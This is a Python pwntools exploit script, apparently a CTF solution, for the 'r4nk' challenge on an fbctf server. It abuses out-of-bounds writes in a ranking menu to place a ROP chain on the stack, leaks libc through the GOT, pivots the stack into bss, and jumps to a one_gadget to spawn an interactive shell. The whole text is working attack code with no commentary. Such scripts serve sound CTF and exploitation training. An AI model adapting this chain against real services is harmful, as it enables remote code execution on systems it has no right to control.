from pwn import *

w = remote("challenges.fbctf.com",1339)
ww = ELF("./r4nk")
www = ELF("./libc-2.27.so")

sla = w.sendlineafter
sl = w.sendline

def rank(idx,addr):
    sla(">","2")
    sla(">",str(idx))
    sla(">",str(addr))

gad1 = 0x400b3a
gad2 = 0x400b20
rdi = 0x400b43

rspr13 = 0x400980

rank(17,gad1)
rank(18,0)
rank(19,1)
rank(20,ww.got['write'])
rank(21,1)
rank(22,ww.got['write'])
rank(23,0x8)
rank(24,gad2)
rank(25,0)
rank(26,0)
rank(27,1)
rank(28,ww.got['read'])
rank(29,0)
rank(30,ww.bss()+0x200)
rank(31,0x400)
rank(32,gad2)
rank(33,0)
rank(34,0)
rank(35,0)
rank(36,0)
rank(37,0)
rank(38,0)
rank(39,0)
rank(40,rspr13)
rank(41,ww.bss()+0x200)

sl("3")

w.recvuntil("g00dBy3\n")
libc = u64(w.recv(8)) - www.symbols['write']

one = [ 0x4f2c5, 0x4f322, 0x10a38c ]

pay = p64(0)
pay += p64(rdi)
pay += p64(libc+0x1b3e9a)
pay += p64(libc+one[1])
sl(pay)

w.interactive()
